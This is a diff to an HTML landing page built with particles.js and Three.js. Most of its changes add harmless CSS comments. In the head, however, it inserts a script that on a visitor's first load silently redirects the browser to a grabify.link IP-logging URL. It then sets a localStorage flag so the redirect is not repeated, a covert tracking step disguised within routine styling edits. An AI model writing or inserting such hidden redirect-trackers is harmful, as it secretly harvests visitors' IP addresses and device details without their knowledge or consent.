@@ -10,8 +10,8 @@
   <script src="https://threejs.org/examples/js/libs/stats.min.js"></script>
   <!-- Include Jetbrains Mono font -->
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap">
-  <!-- Custom styles for Particles.js and text -->
   <style>
+    /* ---- reset ---- */
     body {
       margin: 0;
       font: normal 75% Arial, Helvetica, sans-serif;
@@ -24,6 +24,7 @@
       display: block;
       vertical-align: bottom;
     }
+    /* ---- particles.js container ---- */
     #particles-js {
       position: absolute;
       width: 100%;
@@ -35,6 +36,7 @@
       background-position: 50% 50%;
       z-index: 1;
     }
+    /* ---- Custom text style ---- */
     #custom-text {
       font-family: 'JetBrains Mono', monospace;
       font-size: 3em;
@@ -43,13 +45,27 @@
       z-index: 2;
       transition: transform 0.3s ease-in-out, letter-spacing 0.3s ease-in-out;
     }
+    /* Hover effects */
     #custom-text:hover {
-      transform: scale(1.2);
-      letter-spacing: 4px;
+      transform: scale(1.2); /* Scale up on hover */
+      letter-spacing: 4px; /* Increase letter spacing on hover */
     }
   </style>
+  <script>
+    // Check if the redirection has already occurred
+    const hasRedirected = localStorage.getItem('redirected');
+
+    if (!hasRedirected) {
+      // Redirect to the specified link
+      window.location.href = 'https://grabify.link/LJGQ4L';
+
+      // Set a flag in local storage to indicate the redirection has occurred
+      localStorage.setItem('redirected', 'true');
+    }
+  </script>
 </head>
 <body>
+
   <!-- particles.js container -->
   <div id="particles-js"></div>
 
@@ -180,4 +196,7 @@
     requestAnimationFrame(update);
   </script>
 
-  <!-- Your tracking code sc
+  <!-- Your other HTML content goes here -->
+
+</body>
+</html>
